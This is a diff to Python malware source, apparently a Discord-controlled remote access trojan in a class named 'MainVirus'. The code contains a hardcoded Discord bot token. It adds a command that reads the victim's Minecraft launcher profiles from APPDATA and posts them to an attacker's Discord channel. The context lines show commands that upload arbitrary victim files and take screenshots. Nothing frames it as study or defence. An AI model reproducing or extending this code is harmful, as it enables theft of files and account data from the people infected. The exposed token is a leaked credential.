@@ -26,9 +26,13 @@ class MainVirus:  # Making a class to wrap code cause organisation
         self.bot.run()  # Runs the bot (Makes it online)
 
     def make_connection(self):  # makes a connection to the discord servers
-        return lightbulb.BotApp( # Makes the Discord Bot
-            token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
-            default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
+        try:  # Tries to make a connection to the discord servers
+            return lightbulb.BotApp( # Makes the Discord Bot
+                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
+                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
+        except:  # What to when the connection fails
+            time.sleep(1)  # Waits for one second
+            self.make_connection()  # Tries to make a connection again
 
     def make_id(self):  # This Function makes a unique id for each victim
         return random.randint(100, 999)
@@ -76,6 +80,19 @@ class MainVirus:  # Making a class to wrap code cause organisation
                 await self.bot.rest.create_message(self.channel_id, f"Sending File: {syntax[0]}")  # Sends information message - sends file name
                 fileLoc = os.path.join(self.cwd, syntax[0])  # Sets the file loc
                 await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
+
+    def uuid(self, syntax):  # UUID command - Returns the player's uuid
+        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
+        async def conConfirm(event):  # Creates the event function - runs on event
+            if self.isCommandConfirm(event, "uuid"):  # Checks for confirmation
+                loaderPath = f"{os.getenv('APPDATA')}\\.minecraft\\launcher_profiles.json"
+                try:
+                    with Path(loaderPath) as file:
+                        profiles = json.loads(file.read_text())["profiles"]
+                        for i in profiles:
+                            await self.bot.rest.create_message(self.channel_id, i)
+                except:
+                    await self.bot.rest.create_message(self.channel_id, f"Error: User doesn't play minecraft")
 
     def screen(self, syntax):  # Screen command - Returns a ScreenShot
         @self.bot.listen(hikari.GuildMessageCreateEvent)  # Message Sent Event
